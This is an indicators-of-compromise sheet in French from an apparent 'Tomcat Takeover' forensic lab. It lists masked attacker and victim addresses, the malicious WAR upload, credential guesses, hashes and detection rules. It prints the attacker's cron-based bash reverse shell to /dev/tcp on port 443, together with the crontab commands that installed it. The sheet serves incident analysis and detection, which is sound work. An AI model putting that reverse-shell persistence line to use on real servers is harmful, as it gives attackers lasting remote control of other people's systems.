# IOCs FR — Tomcat Takeover Lab

## Adresses IP

| IOC | Rôle | Commentaire |
|---|---|---|
| `**********` | Victime | Serveur Tomcat compromis |
| `**********` | Attaquant | Source de l’énumération, de l’upload WAR et du reverse shell |
| `**********` | Client légitime probable | Navigation normale observée avant l’attaque |

## Ports

| Port | Rôle |
|---|---|
| `****` | Service Apache Tomcat exposé |
| `**` | Reverse shell initial vers l’attaquant |
| `***` | Port utilisé par la persistance cron |
| `22` | SSH observé après la compromission dans le trafic |

## Chemins web

```text
/
 /docs/
/examples/
/*******
/*******/
/*******/html
/*******/html/upload
/host-manager
/admin
/admin-console
/status
/webdav
/******/
```

## Fichiers

| Fichier | Rôle |
|---|---|
| `******.***` | Archive WAR malveillante uploadée |
| `********.***` | JSP malveillante utilisée pour le reverse shell |
| `WEB-INF/web.xml` | Configuration de l’application WAR |
| `upload_raw.bin` | Données brutes extraites du POST d’upload |
| `reverse_shell_stream_****.txt` | Flux TCP ASCII du reverse shell |
| `tomcat_takeover_findings.md` | Rapport de synthèse |
| `hashes_sha256.txt` | Hashes SHA256 des preuves |

## User-Agent suspect

```text
************
```

## Identifiants observés

Identifiants testés :

```text
*****:*****
******:******
admin:
*****:******
******:******
*****:******
```

Identifiants valides :

```text
*****:******
```

## Reverse shell

```text
tcp.stream == ****
**********:***** -> **********:80
```

## Persistance

```cron
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'
```

## Commandes observées

```bash
whoami
cd /tmp
pwd
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/**********/443 0>&1'" > cron
crontab -i cron
crontab -l
```

## Hashes SHA256

```text
b0f9ed31b467a45f2ec77338b1b17fb455463423eb70593a4a64cb969c0de188  evidence/******.***
bc06cf70994c655b3f558c820c570e43b7dc52b990e11a10b6856d19b84c5e41  evidence/upload_raw.bin
88a7b5d5ebfbed35e86cddac74893685252c762bdc152942a57e0809e0e9bfad  evidence/reverse_shell_stream_****.txt
6838dd4e167551f7910d2ce6ef23aeaf4f325c897cd5f1d70ee00492d8ceb1c0  evidence/tomcat_takeover_findings.md
bc4900bad640e4937eb70575de02bea6541130e478d2c50d4cc4b2ca4dad4d22  evidence/extracted_war/********.***
3c309168f34178227b65c752ff563db78d769c7c389a6c822a97523d575584a3  evidence/extracted_war/WEB-INF/web.xml
```

## Règles de détection possibles

### Détection HTTP

Chercher :

```text
User-Agent contient ********
URI contient /*******
URI contient /*******/html/upload
URI contient /******/
Méthode POST vers /*******/html/upload
```

### Détection réseau

Chercher :

```text
Connexion sortante depuis un serveur Tomcat vers une IP externe ou inattendue
Connexion sortante vers port 80 ou 443 après upload WAR
Flux interactif avec petits paquets fréquents
```

### Détection système

Chercher :

```text
Nouveau fichier WAR déployé
Nouvelle JSP inconnue
Modification crontab
Commande bash avec /dev/tcp/
Exécution Runtime.getRuntime().exec dans une JSP
```
